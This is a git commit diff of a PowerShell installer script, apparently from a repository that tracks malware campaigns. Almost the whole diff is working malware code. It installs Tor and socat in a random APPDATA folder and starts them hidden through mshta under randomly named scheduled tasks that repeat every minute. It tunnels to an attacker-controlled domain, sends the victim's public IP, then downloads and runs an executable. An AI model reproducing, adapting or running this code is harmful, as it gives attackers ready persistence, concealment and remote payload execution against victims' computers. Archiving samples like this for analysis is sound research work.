b28fd63f30cb2c03703b45a837d12c4947b92a81
Corsin Camichel <cocaman@gmail.com>
2017-10-03 16:37:22 +0200

    Wave 2017-10-03

--- InstallTP.ps1
+++ InstallTP.ps1
@@ -1,3 +1,6 @@
+$SH_TYPE_SCHEDULED_TASK=1;
+$SH_TYPE_TASK_SCHEDULER=2;
+$schedulerType=$SH_TYPE_SCHEDULED_TASK;
 function Unzip
 {
 param([string]$zipfile, [string]$destination);
@@ -28,35 +31,84 @@ $bytes=[System.Convert]::FromBase64String($string);
 #set-content -encoding byte $file -value $bytes;
 [IO.File]::WriteAllBytes($file, $bytes);
 }
-function AddTask
-{
-param([string]$name, [string]$cmd, [string]$params='',[int]$restart=0,[int]$delay=0,[string]$dir='');
-$ts=New-Object Microsoft.Win32.TaskScheduler.TaskService;
-$td=$ts.NewTask();
-$td.RegistrationInfo.Description = 'Does something';
-$td.Settings.DisallowStartIfOnBatteries = $False;
-$td.Settings.StopIfGoingOnBatteries = $False;
-$td.Settings.MultipleInstances = [Microsoft.Win32.TaskScheduler.TaskInstancesPolicy]::IgnoreNew;
-$LogonTrigger = New-Object Microsoft.Win32.TaskScheduler.LogonTrigger;
-$LogonTrigger.StartBoundary=[System.DateTime]::Now;
-$LogonTrigger.UserId=$env:username;
-$LogonTrigger.Delay=[System.TimeSpan]::FromSeconds($delay);
-$td.Triggers.Add($LogonTrigger);
-if($restart -eq 1){
-$TimeTrigger = New-Object Microsoft.Win32.TaskScheduler.TimeTrigger;
-$TimeTrigger.StartBoundary=[System.DateTime]::Now;
-$TimeTrigger.Repetition.Interval=[System.TimeSpan]::FromMinutes(20);
-$TimeTrigger.Repetition.StopAtDurationEnd=$False;
-$td.Triggers.Add($TimeTrigger);
-}
-$ExecAction=New-Object Microsoft.Win32.TaskScheduler.ExecAction($cmd,$params,$dir);
-$td.Actions.Add($ExecAction);
-$task=$ts.RootFolder.RegisterTaskDefinition($name, $td);
-$task.Run();
-}
 function RandomString{
     param([int]$min=5, [int]$max=15);
     return (-join ((48..57)+(65..90)+(97..122) | Get-Random -Count (Get-Random -minimum $min -maximum $max) | % {[char]$_}));
+}
+function InitScheduller{
+    try{
+        Import-Module ScheduledTasks -ErrorAction Stop;
+        return $SH_TYPE_SCHEDULED_TASK;
+    }catch{
+        $File=$env:Temp+'\'+(RandomString)+'.zip';
+        $Dest=$env:Temp+'\'+(RandomString);
+        while (!(Download 'https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg' $File)) {}
+        if ((Test-Path $Dest) -eq 1){Remove-Item -Force -Recurse $Dest;}mkdir $Dest | Out-Null;
+        Unzip $File $Dest;
+        Remove-Item -Force $File;
+        $TSAssembly=$Dest+'\lib\net20\Microsoft.Win32.TaskScheduler.dll';
+        $loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
+        return $SH_TYPE_TASK_SCHEDULER;
+    }
+}
+function xmltime ([datetime] $d){ $d.Touniversaltime().tostring("u") -replace " ","T"}
+function AddTask
+{
+param([string]$name, [string]$cmd, [string]$params='',[int]$restart=0,[int]$delay=0,[string]$dir='');
+switch ($schedulerType) {
+    $SH_TYPE_SCHEDULED_TASK {
+        $Action = New-ScheduledTaskAction -Execute $cmd;
+        if(-Not [String]::IsNullOrEmpty($params)){
+            $Action.Arguments=$params;
+        }
+        if(-Not [String]::IsNullOrEmpty($dir)){
+            $Action.WorkingDirectory=$dir;
+        }
+        $LogonTrigger = New-ScheduledTaskTrigger -AtLogOn;
+        $LogonTrigger.StartBoundary=xmltime(Get-Date);
+        $LogonTrigger.UserId=$env:username;
+        if(-Not $delay -eq 0){
+            $LogonTrigger.Delay=New-TimeSpan -Seconds $delay;
+        }
+        if($restart -eq 1){
+            $TimeTrigger = New-ScheduledTaskTrigger -Once -At 12am -RepetitionInterval ([System.TimeSpan]::FromMinutes(1)) -RepetitionDuration ([System.TimeSpan]::FromDays(365 * 20));
+        }
+        $Settings = New-ScheduledTaskSettingsSet;
+        $Settings.DisallowStartIfOnBatteries = $False;
+        $Settings.StopIfGoingOnBatteries = $False;
+        if($restart -eq 1){
+            $Task = Register-ScheduledTask -Action $Action -Trigger $LogonTrigger,$TimeTrigger -Settings $Settings -TaskName $name -Description (RandomString);
+        }else{
+            $Task = Register-ScheduledTask -Action $Action -Trigger $LogonTrigger -Settings $Settings -TaskName $name -Description (RandomString);
+        }
+        Start-ScheduledTask -InputObject $Task;
+    };
+    Default {
+        $ts=New-Object Microsoft.Win32.TaskScheduler.TaskService;
+        $td=$ts.NewTask();
+        $td.RegistrationInfo.Description = 'Does something';
+        $td.Settings.DisallowStartIfOnBatteries = $False;
+        $td.Settings.StopIfGoingOnBatteries = $False;
+        $td.Settings.MultipleInstances = [Microsoft.Win32.TaskScheduler.TaskInstancesPolicy]::IgnoreNew;
+        $LogonTrigger = New-Object Microsoft.Win32.TaskScheduler.LogonTrigger;
+        $LogonTrigger.StartBoundary=[System.DateTime]::Now;
+        $LogonTrigger.UserId=$env:username;
+        $LogonTrigger.Delay=[System.TimeSpan]::FromSeconds($delay);
+        $td.Triggers.Add($LogonTrigger);
+        if($restart -eq 1){
+        $TimeTrigger = New-Object Microsoft.Win32.TaskScheduler.TimeTrigger;
+        $TimeTrigger.StartBoundary=[System.DateTime]::Now;
+        $TimeTrigger.Repetition.Interval=[System.TimeSpan]::FromMinutes(1);
+        $TimeTrigger.Repetition.StopAtDurationEnd=$False;
+        $td.Triggers.Add($TimeTrigger);
+        }
+        $tsf="Microsoft.Win32.TaskScheduler";
+        $ExecAction=New-Object "$tsf.ExecAction"($cmd,$params,$dir);
+        $td.Actions.Add($ExecAction);
+        $task=$ts.RootFolder.RegisterTaskDefinition($name, $td);
+        $task.Run();
+    };
+}
 }
 function Download {
     param([string]$url, [string]$file);
@@ -80,32 +132,25 @@ function Download {
     return $false;
 }
 function ITP{
-$File=$env:Temp+'\'+(RandomString)+'.zip';
-$Dest=$env:Temp+'\'+(RandomString);
-while (!(Download 'https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg' $File)) {}
-if ((Test-Path $Dest) -eq 1){Remove-Item -Force -Recurse $Dest;}md $Dest | Out-Null;
-Unzip $File $Dest;
-rm -Force $File;
-$TSAssembly=$Dest+'\lib\net20\Microsoft.Win32.TaskScheduler.dll';
-$loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
-$TFile=$env:Temp+'\'+(RandomString)+'.zip'
-$DestTP=$env:APPDATA+'\Ad0be';
+$schedulerType = InitScheduller;
+$tf=$env:Temp+'\'+(RandomString)+'.zip';
+$DestTP=dir($env:APPDATA)|Get-Random|Select-Object -ExpandProperty FullName;
 $TorMirrors=@("https://torproject.urown.net/dist/",
 "https://dist.torproject.org/",
 "https://torproject.mirror.metalgamer.eu/dist/",
 "https://tor.ybti.net/dist/");
 foreach ($mirror in $TorMirrors) {
     $_url=$mirror+'torbrowser/7.0.5/tor-win32-0.3.0.10.zip';
-    if((Download $_url $TFile)){
+    if((Download $_url $tf)){
         break;
     }
 }
 if ((Test-Path $DestTP) -eq 1){Remove-Item -Force -Recurse $DestTP;}mkdir $DestTP | Out-Null;
-Unzip $TFile $DestTP;
-Remove-Item -Force $TFile;
+Unzip $tf $DestTP;
+Remove-Item -Force $tf;
 $tor=$DestTP+'\Tor\tor.exe';
 $tor=$tor.Replace('\','/');
-$tor_cmd="`"javascript:close(new ActiveXObject('WScript.Shell').Run('$tor',0,false))`"";
+$tor_cmd="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$tor`",0,False))";
 AddTask (RandomString) 'mshta.exe' $tor_cmd;
 $SFile=$env:Temp+'\'+(RandomString)+'.zip';
 while (!(Download 'https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip' $SFile)){}
@@ -117,9 +162,11 @@ Rename-Item -path $s_old -newName $s_new;
 $s_fold=$DestTP+'\'+$s_new+'\';
 $s1cmd='socat tcp4-LISTEN:5555,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:80,socksport=9050';
 $s2cmd='socat tcp4-LISTEN:5588,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:5588,socksport=9050';
-$s1_cmd="`"javascript:close(new ActiveXObject('WScript.Shell').Run('$s1cmd',0,false))`"";
-$s2_cmd="`"javascript:close(new ActiveXObject('WScript.Shell').Run('$s2cmd',0,false))`"";
+$s1_cmd="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s1cmd`",0,False))";
+$s2_cmd="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s2cmd`",0,False))";
 AddTask (RandomString) 'mshta.exe' $s1_cmd 0 0 $s_fold;
 AddTask (RandomString) 'mshta.exe' $s2_cmd 0 0 $s_fold;
+$tsts="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"powershell.exe `"`"`$F=`$env:Temp+'\\"+(RandomString)+".exe';rm -Force `$F;`$cl=(New-Object Net.WebClient);`$cl.DownloadFile('http://127.0.0.1:5555/"+(RandomString)+".asp?ts&ip='+`$cl.DownloadString('http://api.ipify.org/'),`$F);& `$F`"`"`",0,False))";
+AddTask (RandomString) 'mshta.exe' $tsts 1;
 }
 ITP
